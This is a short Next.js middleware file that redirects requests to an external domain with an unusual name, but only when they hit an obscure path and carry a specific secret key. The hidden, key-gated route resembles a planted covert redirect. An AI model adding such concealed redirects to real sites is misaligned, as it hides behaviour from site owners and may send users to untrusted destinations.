// pages/_middleware.js
import { NextResponse } from 'next/server';

export function middleware(request) {
  const { pathname, searchParams } = new URL(request.url);

  if (pathname === '/yrbajwpw4' && searchParams.get('key') === 'c13dd6d2f97a5a0f967c85445d720bbb') {
    return NextResponse.redirect('https://cleopatraadulatefrench.com/some-new-path');
  }

  return NextResponse.next();
}
